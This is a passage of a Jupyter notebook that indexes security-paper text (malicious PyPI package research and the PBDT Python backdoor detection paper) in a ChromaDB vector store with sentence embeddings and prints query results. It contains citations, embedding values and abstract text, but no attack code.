coetaur0.2022.Python3controlflowgraphgenerator.RetrievedAugust8,2022\\nfrom https://github.com/coetaur0/staticfg.\\n[10] Alibaba company. 2024. Pypi mirror of alibaba company. Retrieved May 20,\\n2024 from https://mirrors.aliyun.com/pypi/simple/.\\n[11] Huawei company. 2024. Pypi mirror of huawei company. Retrieved May 20,\\n2024 from https://mirrors.huaweicloud.com/repository/pypi/simple/.\\n[12] Snykio company. 2024. Open source vulnerability database. Retrieved May 20,\\n2024 from https://security.snyk.io/.\\n[13] Tencent company. 2024. Pypi mirror of tencent company. Retrieved May 20,\\n2024 from https://mirrors.cloud.tencent.com/pypi/simple.\\n[14] VirusTOTAL company. 2024. Analyse suspicious files, domains, ips and urls to\\ndetectmalwareandotherbreaches,automaticallysharethemwiththesecurity\\ncommunity. Retrieved May 20, 2024 from https://www.virustotal.com/gui/ho\\nme/upload.\\n[15] Jacob Devlin, Ming-Wei Chang, Kenton Lee, and Kristina Toutanova. 2019.\\nBERT:pre-trainingofdeepbidirectionaltransformersforlanguageunderstand-\\ning. InProceedings of the 2019 Conference of the North American Chapter of\\nthe Association for Computational Linguistics: Human Language Technologies,\\nNAACL-HLT 2019, Minneapolis, MN, USA, June 2-7, 2019, Volume 1 (Long and\\nShort Papers). Jill Burstein, Christy Doran, and Thamar Solorio, (Eds.) Associa-\\ntion for Computational Linguistics, 4171\\u20134186. doi: 10.18653/V1/N19-1423.\\n[16] douban. 2024. Pypi mirror of douban company. Retrieved May 20, 2024 from\\nhttp://pypi.doubanio.com/simple/.\\n[17] Ruian Duan, Omar Alrawi, Ranjita Pai Kasturi, Ryan Elder, Brendan Saltafor-\\nmaggio, and Wenke Lee. 2021. Towards measuring supply chain attacks on\\npackage managers for interpreted languages. In28th Annual Network and Dis-\\ntributed System Security Symposium, NDSS 2021, virtually, February 21-25, 2021.\\nThe Internet Society. https://www.ndss-symposium.org/ndss-paper/towards-\\nmeasuring-supply-chain-attacks-on-package-managers-for-interpreted-lan\\nguages/.\\n[18] Yong Fang, Mingyu Xie, and Cheng Huang. 2021. PBDT: python backdoor\\ndetection model based on combined features.Secur. Commun. Networks, 2021,\\n9923234:1\\u20139923234:13. doi: 10.1155/2021/9923234.\\n[19] Danielle Gonzalez, Thomas Zimmermann, Patrice Godefroid, and Max Schae-\\nfer. 2021. Anomalicious: automated detection of anomalous and potentially\\nmalicious commits on github. In43rd IEEE/ACM International Conference on\\nSoftwareEngineering:SoftwareEngineeringinPractice,ICSE(SEIP)2021,Madrid,\\nSpain,May25-28,2021 .IEEE,258\\u2013267.doi:10.1109/ICSE-SEIP52600.2021.00035.\\n[20] Yacong Gu, Lingyun Ying, Yingyuan Pu, Xiao Hu, Huajun Chai, Ruimin Wang,\\nXingGao,andHaixinDuan.2023.Investigatingpackagerelatedsecuritythreats\\nin software registries. In44th IEEE Symposium on Security and Privacy, SP 2023,\\nSan Francisco, CA, USA, May 21-25, 2023. IEEE, 1578\\u20131595. doi: 10.1109/SP4621\\n5.2023.10179332.\\n[21] Wenbo Guo, Zhengzi Xu, Chengwei Liu, Cheng Huang, Yong Fang, and Yang\\nLiu. 2023. An empirical study of malicious code in pypi ecosystem.CoRR,\\nabs/2309.11021. arXiv: 2309.11021. doi: 10.48550/ARXIV.2309.11021.\\n[22] Gao K, He H, Xie B, and Zhou MH. 2024. Survey on open source software\\nsupply chains.Journal of Software (in Chinese), 35, 581\\u2013603. doi: 10.13328/j.cn\\nki.jos.006975.\\n[23] Genpei Liang, Xiangyu Zhou, Qingyu Wang, Yutong Du, and Cheng Huang.\\n2021. Malicious packages lurking in user-friendly python package index. In\\n20th IEEE International Conference on Trust, Security and Privacy in Computing\\nand Communications, TrustCom 2021, Shenyang, China, October 20-22, 2021.\\nIEEE, 606\\u2013613. doi: 10.1109/TRUSTCOM53373.2021.00091.\\n[24] Wentao Liang, Xiang Ling, Jingzheng Wu, Tianyue Luo, and Yanjun Wu. 2023.\\nAneedleisanoutlierinahaystack:huntingmaliciouspypipackageswithcode\\nclustering. In38th IEEE/ACM International Conference on Automated Software\\nEngineering, ASE 2023, Luxembourg, September 11-15, 2023. IEEE, 307\\u2013318. doi:\\n10.1109/ASE56229.2023.00085.\\n[25] lwn. 2024. A backdoor in xz. Retrieved May 20, 2024 from https://lwn.net/Arti\\ncles/967194/.\\n[26] 2024. Maven index. https://maven.apache.org/.\\n[27]ShradhaNeupane,GrantHolmes,ElizabethWyss,DrewDavidson,andLorenzo\\nDe Carli. 2023. Beyond typosquatting: an in-depth look at package confusion.\\nIn32nd USENIX Security Symposium, USENIX Security 2023, Anaheim, CA, USA,\\nAugust 9-11, 2023. Joseph A. Calandrino and Carmela Troncoso, (Eds.) USENIX\\nAssociation, 3439\\u20133456. https://www.usenix.org/conference/usenixsecurity23\\n/presentation/neupane.\\n[28] 2024. New malicious pypi packages caught using covert side-loading tactics.\\nhttps://thehackernews.com/2024/02/new-malicious-pypi-packages-caught.h\\ntml.\\n[29] 2024. Npm index. https://www.npmjs.com/.\\n[30] 2024. Nuget index. https://www.nuget.org/.\\n[31]Marc Ohm, Henrik Plate, Arnold Sykosch, and Michael Meier. 2020. Backstab-\\nber\\u2019s knife collection: A review of open source software supply chain attacks.\\nIn Detection of Intrusions and Malware, and Vulnerability Assessment - 17th\\nInternational Conference, DIMVA 2020, Lisbon, Portugal, June 24-26, 2020, Pro-\\nceedings(LectureNotesinComputerScience).Cl\\u00e9mentineMaurice,LeylaBilge,\\nGianluca Stringhini, and Nuno Neves, (Eds.) Vol. 12223. Springer, 23\\u201343. doi:\\n10.1007/978-3-030-52683-2\\\\_2.\\n[32] Adam Paszke et al. 2019. Pytorch: an imperative style, high-performance deep\\nlearning library. InProceedings of the 33rd Annual Conference on Neural Infor-\\nmation Processing Systems (NeurIPS), 8024\\u20138035.\\n[33] 2024. Pypi index. https://pypi.org/.\\n[34] 2024. Pypi simple. https://pypi.org/simple/.\\n[35]Qi\\u2018anxin. 2021. 2021 china software supply chain security analysis report.\\nRetrieved June 2, 2021 from https://www.qianxin.com/threat/reportdetail?rep\\nort_id=132.\\n[36] Qi\\u2018anxin. 2022. 2022china software supply chain security analysis report. Re-\\ntrieved July 26, 2022 from https://www.qianxin.com/threat/reportdetail?report\\n_id=161.\\n[37] Qi\\u2018anxin. 2023. 2023 china software supply chain security analysis report.\\nRetrieved July 24, 2023 from https://www.qianxin.com/threat/reportdetail?rep\\nort%5C_id=297.\\n[38] Qi\\u2018anxin. 2024. Pypi massive forged packet name attack. Retrieved March 29,\\n2024 from https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ.\\n[39] Vitalis Salis, Thodoris Sotiropoulos, Panos Louridas, Diomidis Spinellis, and\\nDimitris Mitropoulos. 2021. Pycg: practical call graph generation in python.\\nIn 43rd IEEE/ACM International Conference on Software Engineering, ICSE 2021,\\nMadrid, Spain, 22-30 May 2021. IEEE, 1646\\u20131657. doi: 10.1109/ICSE43902.2021\\n.00146.\\n[40] Adriana Sejfia and Max Sch\\u00e4fer. 2022. Practical automated detection of mali-\\nciousnpmpackages.In 44thIEEE/ACM44thInternationalConferenceonSoftware\\nEngineering, ICSE 2022, Pittsburgh, PA, USA, May 25-27, 2022. ACM, 1681\\u20131692.\\ndoi: 10.1145/3510003.3510104.\\n[41] 2024. Tiobe index. https://www.tiobe.com/tiobe-index/.\\n[42] Tsinghua university. 2024. Pypi mirror of tsinghua university. Retrieved May\\n20, 2024 from https://pypi.tuna.tsinghua.edu.cn/simple/.\\n[43] D.-L. Vu. 2020. A fork of bandit tool with patterns to identifying malicious\\npython code. https://github.com/lyvd/bandit4mal.\\n[44] Duc Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate, and Antonino Sa-\\nbetta. 2021. Lastpymile: identifying the discrepancy between sources and pack-\\nages.InESEC/FSE\\u201921:29thACMJointEuropeanSoftwareEngineeringConference\\nand Symposium on the Foundations of Software Engineering, Athens, Greece, Au-\\ngust 23-28, 2021. Diomidis Spinellis, Georgios Gousios, Marsha Chechik, and\\nMassimiliano Di Penta, (Eds.) ACM, 780\\u2013792. doi: 10.1145/3468264.3468592.\\n[45] Thomas Wolf et al. 2019. Huggingface\\u2019s transformers: state-of-the-art natural\\nlanguage processing.arXiv preprint arXiv: 1910.03771.\\n[46] Elizabeth Wyss, Alexander Wittman, Drew Davidson, and Lorenzo De Carli.\\n2022. Wolf at the door: preventing install-time attacks in npm with latch. In\\nASIACCS\\u201922:ACMAsiaConferenceonComputerandCommunicationsSecurity,\\nNagasaki, Japan, 30 May 2022 - 3 June 2022. Yuji Suga, Kouichi Sakurai, Xuhua\\nDing, and Kazue Sako, (Eds.) ACM, 1139\\u20131153. doi: 10.1145/3488932.3523262.\\n[47] Jiale Zhang, Chengcheng Zhu, Chunpeng Ge, Chuan Ma, Yanchao Zhao, Xi-\\naobing Sun, and Bing Chen. 2024. Badcleaner: defending backdoor attacks in\\nfederated learning via attention-based multi-teacher distillation.IEEE Trans.\\nDependable Secur. Comput., 21, 5, 4559\\u20134573.\\n[48] Jiale Zhang, Chengcheng Zhu, Xiaobing Sun, Chunpeng Ge, Bing Chen, Willy\\nSusilo,andShuiYu.2024.Flpurifier:backdoordefenseinfederatedlearningvia\\ndecoupled contrastive training.IEEE Trans. Inf. Forensics Secur., 19, 4752\\u20134766.\\n[49] Jiale Zhang, Chengcheng Zhu, Di Wu, Xiaobing Sun, Jianming Yong, and\\nGuodong Long. 2021. Badfss: backdoor attacks on federated self-supervised\\nlearning. InProceedings of the 33rd International Joint Conference on Artificial\\nIntelligence (IJCAI).\\n[50] Junan Zhang, Kaifeng Huang, Bihuan Chen, Chong Wang, Zhenhao Tian, and\\nXin Peng. 2023. Malicious package detection in NPM and pypi using a single\\nmodelofmaliciousbehaviorsequence. CoRR,abs/2309.02637.arXiv:2309.02637.\\ndoi: 10.48550/ARXIV.2309.02637.\\n[51] YimingZhang,YujieFan, ShifuHou,YanfangYe,XushengXiao,PanLi, Chuan\\nShi,LiangZhao,andShouhuaiXu.2020.Cyber-guideddeepneuralnetworkfor\\nmalicious repository detection in github. In2020 IEEE International Conference\\non Knowledge Graph, ICKG 2020, Online, August 9-11, 2020. Enhong Chen and\\nGrigoris Antoniou, (Eds.) IEEE, 458\\u2013465. doi: 10.1109/ICBK50248.2020.00071.\\n[52] Anmin Zhou, Tianyi Huang, Cheng Huang, Dunhan Li, and Chuangchuang\\nSong. 2022. Pycomm: malicious commands detection model for python scripts.\\nJ. Intell. Fuzzy Syst., 42, 3, 2261\\u20132273. doi: 10.3233/JIFS-211557.\\n1170\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. \"\n",
      "}\n",
      "score: 0.06033829771023746\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "\n",
    "for hit in hits:\n",
    "    print(json.dumps(hit.payload, indent=2))\n",
    "    print(\"score:\", hit.score)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e08e4edb",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "17722c20",
   "metadata": {},
   "outputs": [],
   "source": [
    "import chromadb\n",
    "\n",
    "# For an in-memory instance (data is not persisted)\n",
    "client = chromadb.Client()\n",
    "\n",
    "# For a persistent instance (data is saved to disk)\n",
    "# client = chromadb.PersistentClient(path=\"path/to/your/chroma_db\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "2af9e97a",
   "metadata": {},
   "outputs": [],
   "source": [
    "collection_name = \"my_documents\"\n",
    "collection = client.get_or_create_collection(name=collection_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "e30925a0",
   "metadata": {},
   "outputs": [],
   "source": [
    "embeddings =[\n",
    "        encoder.encode(doc[\"data\"]).tolist()\n",
    "        for doc in documents\n",
    "    ]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "993629c8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[-0.10231786966323853,\n",
       " 0.03884272277355194,\n",
       " -0.009886211715638638,\n",
       " -0.02548011764883995,\n",
       " -0.00843384675681591,\n",
       " -0.060136012732982635,\n",
       " 0.07843732833862305,\n",
       " 0.029126381501555443,\n",
       " 0.0380822978913784,\n",
       " -0.00318942335434258,\n",
       " 0.012428926303982735,\n",
       " -0.0063712457194924355,\n",
       " 0.1191607341170311,\n",
       " 0.03740200400352478,\n",
       " 0.014361702837049961,\n",
       " 0.014668512158095837,\n",
       " -0.022604146972298622,\n",
       " 0.044772665947675705,\n",
       " 0.024940093979239464,\n",
       " -0.05348007380962372,\n",
       " -0.0474286749958992,\n",
       " -0.010265951976180077,\n",
       " -0.04467985779047012,\n",
       " 0.041803862899541855,\n",
       " -0.06506053358316422,\n",
       " -0.041189778596162796,\n",
       " -0.06850238144397736,\n",
       " 0.016066089272499084,\n",
       " -0.023639196529984474,\n",
       " -0.012441636994481087,\n",
       " -0.023678215220570564,\n",
       " 0.07648281008005142,\n",
       " 0.005355120170861483,\n",
       " 0.018500324338674545,\n",
       " 0.04129360243678093,\n",
       " 0.05991631746292114,\n",
       " -0.028266189619898796,\n",
       " -0.035140667110681534,\n",
       " 0.045688338577747345,\n",
       " -0.07624939829111099,\n",
       " 0.016479967162013054,\n",
       " -0.060813456773757935,\n",
       " -0.054565638303756714,\n",
       " 0.04367081820964813,\n",
       " -0.11576860398054123,\n",
       " -0.0040646689012646675,\n",
       " 0.012595893815159798,\n",
       " 0.02298840507864952,\n",
       " -0.004995995666831732,\n",
       " -0.07793719321489334,\n",
       " 0.011342514306306839,\n",
       " 0.011845463886857033,\n",
       " -0.04855990409851074,\n",
       " -0.024636730551719666,\n",
       " 0.00046793100773356855,\n",
       " -0.036611348390579224,\n",
       " 0.011357675306499004,\n",
       " -0.004018391016870737,\n",
       " -0.04013252258300781,\n",
       " -0.03250034153461456,\n",
       " -0.019463129341602325,\n",
       " 0.00830919947475195,\n",
       " -0.007861859165132046,\n",
       " 0.017179271206259727,\n",
       " -0.05559147149324417,\n",
       " 0.06305253505706787,\n",
       " 0.04506617411971092,\n",
       " 0.050639793276786804,\n",
       " 0.024636469781398773,\n",
       " 0.0735514685511589,\n",
       " -0.01787159964442253,\n",
       " 0.024819863960146904,\n",
       " -0.05333656072616577,\n",
       " 0.0866723358631134,\n",
       " 0.011650131084024906,\n",
       " 0.08059704303741455,\n",
       " 0.0031979847699403763,\n",
       " -0.007935740984976292,\n",
       " -0.041580408811569214,\n",
       " -0.09357376396656036,\n",
       " 0.04703865200281143,\n",
       " 0.03176881745457649,\n",
       " -0.025094255805015564,\n",
       " 0.025015657767653465,\n",
       " 0.05085178464651108,\n",
       " -0.014127681963145733,\n",
       " 0.05622506141662598,\n",
       " 0.008319656364619732,\n",
       " 0.1353902667760849,\n",
       " 0.04038795828819275,\n",
       " -0.01760748401284218,\n",
       " -0.12232712656259537,\n",
       " 0.14022506773471832,\n",
       " 0.027567293494939804,\n",
       " 0.09962429106235504,\n",
       " 0.02021976187825203,\n",
       " 0.021886443719267845,\n",
       " -0.03751911222934723,\n",
       " -0.06100725755095482,\n",
       " 0.06272110342979431,\n",
       " 0.009272201918065548,\n",
       " -0.03389887511730194,\n",
       " 0.03265152499079704,\n",
       " -0.07400517165660858,\n",
       " 0.045601826161146164,\n",
       " 0.052901893854141235,\n",
       " -0.016690528020262718,\n",
       " -0.126180499792099,\n",
       " 0.0687028095126152,\n",
       " -0.03253192827105522,\n",
       " -0.05966825410723686,\n",
       " -0.05283840000629425,\n",
       " 0.03069833107292652,\n",
       " -0.10202878713607788,\n",
       " -0.026555972173810005,\n",
       " 0.021428678184747696,\n",
       " -0.03807051107287407,\n",
       " 0.057012155652046204,\n",
       " -0.010427610017359257,\n",
       " -0.05166846513748169,\n",
       " 0.10384180396795273,\n",
       " 0.030707918107509613,\n",
       " 0.10115338116884232,\n",
       " -0.04448077827692032,\n",
       " 0.01755722425878048,\n",
       " 0.0013842432526871562,\n",
       " -0.05209356173872948,\n",
       " 4.118457232095166e-33,\n",
       " -0.01538225170224905,\n",
       " 0.0705772191286087,\n",
       " -0.042376574128866196,\n",
       " 0.024642134085297585,\n",
       " 0.04081480950117111,\n",
       " -0.05394003540277481,\n",
       " 0.03566679358482361,\n",
       " 0.03869441896677017,\n",
       " -0.04395817592740059,\n",
       " -0.0003060011949855834,\n",
       " -0.11789393424987793,\n",
       " -0.008801574818789959,\n",
       " 0.023590324446558952,\n",
       " 0.10999993979930878,\n",
       " 0.0793360099196434,\n",
       " 0.07426369190216064,\n",
       " 0.015185060910880566,\n",
       " 0.08529258519411087,\n",
       " 0.06764592975378036,\n",
       " 0.03240111470222473,\n",
       " 0.02588675357401371,\n",
       " -0.0603167749941349,\n",
       " 0.022188512608408928,\n",
       " 0.007849556393921375,\n",
       " 0.06785321980714798,\n",
       " -0.02376340515911579,\n",
       " -0.033371906727552414,\n",
       " 0.01158487144857645,\n",
       " 0.03308620676398277,\n",
       " 0.021925996989011765,\n",
       " 0.014674050733447075,\n",
       " -0.04406939446926117,\n",
       " 0.03034394048154354,\n",
       " 0.04539494961500168,\n",
       " 0.015923455357551575,\n",
       " -0.050648484379053116,\n",
       " -0.041111137717962265,\n",
       " -0.07652313262224197,\n",
       " 0.007500415202230215,\n",
       " -0.04214426130056381,\n",
       " 0.004650998394936323,\n",
       " 0.07431302964687347,\n",
       " -0.04504261538386345,\n",
       " 0.059861794114112854,\n",
       " 0.026234546676278114,\n",
       " -0.013175377622246742,\n",
       " -0.09095849841833115,\n",
       " 0.032774459570646286,\n",
       " 0.05321009084582329,\n",
       " -0.06075844541192055,\n",
       " -0.009746073745191097,\n",
       " -0.010602954775094986,\n",
       " 0.014716909267008305,\n",
       " 0.07665952295064926,\n",
       " -0.09726545959711075,\n",
       " -0.031237768009305,\n",
       " -0.0026119162794202566,\n",
       " 0.027323495596647263,\n",
       " 0.058266591280698776,\n",
       " -0.006676736753433943,\n",
       " 0.02360314130783081,\n",
       " -0.03480422869324684,\n",
       " -0.01821846514940262,\n",
       " 0.002619311911985278,\n",
       " 0.043775010854005814,\n",
       " -0.027061954140663147,\n",
       " 0.04247191548347473,\n",
       " 0.03248345106840134,\n",
       " -0.010452263057231903,\n",
       " 0.053294919431209564,\n",
       " -0.04296467825770378,\n",
       " -0.013473455794155598,\n",
       " -0.03097662888467312,\n",
       " -0.0014664556365460157,\n",
       " 0.018400229513645172,\n",
       " -0.04117229953408241,\n",
       " 0.04839130863547325,\n",
       " 0.022613083943724632,\n",
       " 0.0025096372701227665,\n",
       " -0.0553816519677639,\n",
       " -0.017546309158205986,\n",
       " -0.02113110013306141,\n",
       " 0.09287622570991516,\n",
       " -0.012807595543563366,\n",
       " -0.10317972302436829,\n",
       " 0.013806936331093311,\n",
       " -0.029703227803111076,\n",
       " -0.03060465306043625,\n",
       " -0.05793340131640434,\n",
       " -0.01281261071562767,\n",
       " -0.023167777806520462,\n",
       " -0.0387958325445652,\n",
       " 0.008032681420445442,\n",
       " 6.50514048174955e-05,\n",
       " -0.023713747039437294,\n",
       " -4.534610517619073e-33,\n",
       " -0.07848156243562698,\n",
       " 0.00938663724809885,\n",
       " -0.01752038672566414,\n",
       " 0.027395177632570267,\n",
       " -0.062243785709142685,\n",
       " -0.0506104975938797,\n",
       " -0.010305272415280342,\n",
       " -0.010117139667272568,\n",
       " 0.02505778707563877,\n",
       " 0.005741594359278679,\n",
       " -0.07702735811471939,\n",
       " -0.030909482389688492,\n",
       " 0.03454523906111717,\n",
       " -0.105091892182827,\n",
       " 0.0691075250506401,\n",
       " 0.04272778704762459,\n",
       " -0.042962826788425446,\n",
       " 0.015334177762269974,\n",
       " -0.054253946989774704,\n",
       " 0.0371549054980278,\n",
       " -0.015560862608253956,\n",
       " 0.03153334930539131,\n",
       " -0.02428654208779335,\n",
       " -0.025852637365460396,\n",
       " 0.040299974381923676,\n",
       " 0.027762189507484436,\n",
       " 0.0214302409440279,\n",
       " -0.00900725182145834,\n",
       " -0.013955251313745975,\n",
       " 0.004703364335000515,\n",
       " -0.050143513828516006,\n",
       " 0.06101463362574577,\n",
       " -0.11992722749710083,\n",
       " -0.0664074495434761,\n",
       " -0.022451238706707954,\n",
       " 0.02057071030139923,\n",
       " 0.05117203667759895,\n",
       " 0.05255402624607086,\n",
       " 0.00038054873584769666,\n",
       " 0.031008576974272728,\n",
       " 0.0904788076877594,\n",
       " 0.058734994381666183,\n",
       " -0.05036354809999466,\n",
       " 0.006359240971505642,\n",
       " -0.023264091461896896,\n",
       " -0.04326795041561127,\n",
       " -0.09336172789335251,\n",
       " 0.020992707461118698,\n",
       " 0.10188800096511841,\n",
       " -0.09591563045978546,\n",
       " -0.03548761084675789,\n",
       " 0.041994642466306686,\n",
       " 0.018948011100292206,\n",
       " 0.007203890010714531,\n",
       " 0.0022243077401071787,\n",
       " -0.009532161988317966,\n",
       " 0.05367717519402504,\n",
       " 0.062125179916620255,\n",
       " -0.00981947872787714,\n",
       " 0.007151979487389326,\n",
       " -0.03157247230410576,\n",
       " -0.030928753316402435,\n",
       " 0.04434460774064064,\n",
       " 0.017969248816370964,\n",
       " -0.013508287258446217,\n",
       " 0.031165875494480133,\n",
       " -0.10435350239276886,\n",
       " -0.006539563182741404,\n",
       " -0.010004349052906036,\n",
       " -0.0019377960124984384,\n",
       " 0.06872124969959259,\n",
       " -0.023012012243270874,\n",
       " -0.039941638708114624,\n",
       " -0.03386622294783592,\n",
       " -0.054444797337055206,\n",
       " -0.03474881500005722,\n",
       " -0.010092259384691715,\n",
       " -0.034185849130153656,\n",
       " 0.020646365359425545,\n",
       " 0.07150903344154358,\n",
       " 0.05318710580468178,\n",
       " -0.022701336070895195,\n",
       " 0.007705315947532654,\n",
       " 0.060192715376615524,\n",
       " -0.03812437132000923,\n",
       " -0.06347562372684479,\n",
       " 0.05679931119084358,\n",
       " 0.09092022478580475,\n",
       " 0.07013098895549774,\n",
       " 0.03216494247317314,\n",
       " -0.01044923160225153,\n",
       " 0.0251066442579031,\n",
       " 0.0005423794500529766,\n",
       " 0.03633718192577362,\n",
       " 0.07539265602827072,\n",
       " -4.600280689714964e-08,\n",
       " 0.02269214764237404,\n",
       " -0.03419607877731323,\n",
       " -0.06586664915084839,\n",
       " 0.041384607553482056,\n",
       " 0.03329477086663246,\n",
       " 0.05049895867705345,\n",
       " -0.17172004282474518,\n",
       " 0.05060287192463875,\n",
       " -0.0058511001989245415,\n",
       " -0.06206546351313591,\n",
       " 0.057303570210933685,\n",
       " -0.035625286400318146,\n",
       " -0.09429052472114563,\n",
       " -0.05923667177557945,\n",
       " -0.03470611572265625,\n",
       " 0.12576928734779358,\n",
       " -0.08235331624746323,\n",
       " 0.048405785113573074,\n",
       " -0.10924302786588669,\n",
       " -0.07209618389606476,\n",
       " -0.02009456418454647,\n",
       " 0.052614159882068634,\n",
       " -0.013537839986383915,\n",
       " 0.01155187375843525,\n",
       " 0.01695745438337326,\n",
       " -0.0259023979306221,\n",
       " 0.04602668806910515,\n",
       " -0.026251202449202538,\n",
       " 0.025991290807724,\n",
       " 0.05680237337946892,\n",
       " 0.0055299499072134495,\n",
       " -0.05270589888095856,\n",
       " -0.04902788996696472,\n",
       " -0.0398826040327549,\n",
       " 0.05692890286445618,\n",
       " 0.12334463745355606,\n",
       " -0.07572722434997559,\n",
       " -0.049060024321079254,\n",
       " 0.023070236667990685,\n",
       " 0.050769586116075516,\n",
       " -0.05731819197535515,\n",
       " -0.08184676617383957,\n",
       " 0.008044772781431675,\n",
       " -0.009642367251217365,\n",
       " 0.04180506616830826,\n",
       " -0.018411578610539436,\n",
       " -0.0976121798157692,\n",
       " -0.044435352087020874,\n",
       " 0.037258654832839966,\n",
       " -0.03162826597690582,\n",
       " 0.06847123056650162,\n",
       " 0.01130885910242796,\n",
       " -0.03947131335735321,\n",
       " 0.11056655645370483,\n",
       " -0.019361253827810287,\n",
       " 0.009120773524045944,\n",
       " -0.04819599539041519,\n",
       " -0.0612596720457077,\n",
       " 0.0937310978770256,\n",
       " -0.006299661472439766,\n",
       " -0.019612561911344528,\n",
       " -0.03535594046115875,\n",
       " 0.16454944014549255,\n",
       " -0.02914493717253208]"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "embeddings[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "ae2064e4",
   "metadata": {},
   "outputs": [],
   "source": [
    "metadatas = [\n",
    "    doc['metadata'] for doc in documents\n",
    "]\n",
    "documents = [\n",
    "    doc['data'] for doc in documents\n",
    "]\n",
    "ids = [\n",
    "    str(idx) for idx in range(len(documents))\n",
    "]\n",
    "collection.add(\n",
    "    embeddings=embeddings,\n",
    "    documents=documents,\n",
    "    metadatas=metadatas,\n",
    "    ids=ids\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "3cceb1b0",
   "metadata": {},
   "outputs": [],
   "source": [
    "query = 'Levenshtein distance'\n",
    "query_embedding = encoder.encode(query).tolist()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "91e4363e",
   "metadata": {},
   "outputs": [],
   "source": [
    "results = collection.query(\n",
    "    query_embeddings=[query_embedding],\n",
    "    n_results=2,  # Number of most similar results to return\n",
    "    include=[\"documents\", \"metadatas\", \"distances\"]  # What information to include in the results\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "9dacbc92",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"ids\": [\n",
      "    [\n",
      "      \"2\",\n",
      "      \"0\"\n",
      "    ]\n",
      "  ],\n",
      "  \"embeddings\": null,\n",
      "  \"documents\": [\n",
      "    [\n",
      "      \"Research Article\\nPBDT: Python Backdoor Detection Model Based on\\nCombined Features\\nYong Fang, Mingyu Xie, and Cheng Huang\\nSchool of Cyber Science and Engineering, Sichuan University, Chengdu, China\\nCorrespondence should be addressed to Cheng Huang; opcodesec@gmail.com\\nReceived 1 April 2021; Accepted 31 August 2021; Published 14 September 2021\\nAcademic\\nEditor: Shah Nazir\\nCopyright \\u00a9 2021 Yong Fang et al. 'is is an open access article distributed under the Creative Commons Attribution License,\\nwhich permits unrestricted use, distribution, and reproduction in any medium, provided the original work is properly cited.\\nApplication security is essential in today\\u2019s highly development period. Backdoor is a means by which attackers can invade the\\nsystem to achieve illegal purposes and damage users\\u2019 rights. It has posed a serious threat to network security. 'us, it is urgent to\\ntakeadequatemeasurestodefendsuchattacks.PreviousresearchworkwasmainlyfocusedonnumerousPHPwebshells,withless\\nresearch on Python backdoor \\ufb01les. Language di\\ufb00erences make the method not entirely applicable. 'is paper proposes a Python\\nbackdoor detection model named PBDT based on combined features. 'e model summarizes the common functional modules\\nandfunctionsinthebackdoor\\ufb01lesandextractsthenumberofcallsinthetexttoformsamplefeatures.Whatismore,weconsider\\nthe text\\u2019s statistical characteristics, including the information entropy, the longest string, etc., to identify the obfuscated Python\\ncode. Besides, the opcode sequence is used to represent code characteristics, such as TF-IDF vector and FastText classi\\ufb01er, to\\neliminate the in\\ufb02uence of interference items. Finally, we introduce the Random Forest algorithm to build a classi\\ufb01er. Covering\\nmosttypesofbackdoors,somesamplesareobfuscated,themodelachievesanaccuracyof97.70%,andtheTNRindexisashighas\\n98.66%, showing a good classi\\ufb01cation performance in Python backdoor detection.\\n1. Introduction\\nWiththerapiddevelopmentofnetworktechnologyinrecent\\nyears, various applications have become the primary way to\\nprovide information services, signi\\ufb01cantly improving the\\nconvenienceofpeople\\u2019s life. However,oncecriminalsutilize\\nit, it will cause data leakage and property damage. Among\\nthem, the backdoor is an e\\ufb00ective means for attackers to\\nachieve the purpose of intrusion. 'e 2020 State of Malware\\nReport [1] released by Malwarebytes Labs shows that\\nbackdoors have continuously become the top ten common\\nsecurity threat\\u2019s categories among users and commercial\\nproducts, and the proportion is increasing. Su\\ufb03cient\\nidenti\\ufb01cation of backdoors to take further measures has\\nbecome the current research\\u2019s focus in cyber security.\\nAs a concise, easy-to-read, and extensible programming\\nlanguage, Python has beenwidely used in large-scale project\\ndevelopment while initially only writing automated scripts.\\nNevertheless, there is little research on malicious Python\\ncode. Most of the existing backdoor-related research is\\naimed at PHP or general-purpose webshells [2\\u20138] and has\\nnotconsideredotherbackdoortypes.Simultaneously,dueto\\nthedi\\ufb00erencesinprogramminglanguages,existingmethods\\nare not fully applicable to Python text. 'ere are feature\\nselections for programming language functions or pro-\\ngramming features in the research methods, such as PHP\\nlanguage tags \\u201c<?php. . .?>\\u201d, \\u201cshell_exec ()\\u201d functions, etc.\\n'ese features should have corresponding changes to the\\nPython language. At the same time, the previous research\\ndid not involve a more detailed analysis and summary of\\nfunction behavior of the backdoor. We think that these are\\nessential when judging the maliciousness.\\n'e attacker will use the backdoor to perform a series of\\nsubsequent operations, which must leave traces on the\\nvictim\\u2019s host. Some studies [9, 10] use the dynamic acqui-\\nsition of logs and other information to capture backdoor\\nbehaviors for detection. However, some can use system\\nprocesses to hide their existence, such as thread insertion\\nbackdoor (Section 2.1), and this method does not identify\\nwell. As deep learning is widely used in the security \\ufb01eld,\\nsome papers [11\\u201314] use deep neural networks to check\\nwebshells and achieve good results. Nevertheless, Python\\nHindawi\\nSecurity and Communication Networks\\nVolume 2021, Article ID 9923234, 13 pages\\nhttps://doi.org/10.1155/2021/9923234\\nbackdoordatasetissparse,sotrainingadeepneuralnetwork\\nmay cause over\\ufb01tting and consume numerous system re-\\nsources, resulting in poor overall performance. Moreover,\\nthe full-text feature extraction ignores the functions and\\nmodules 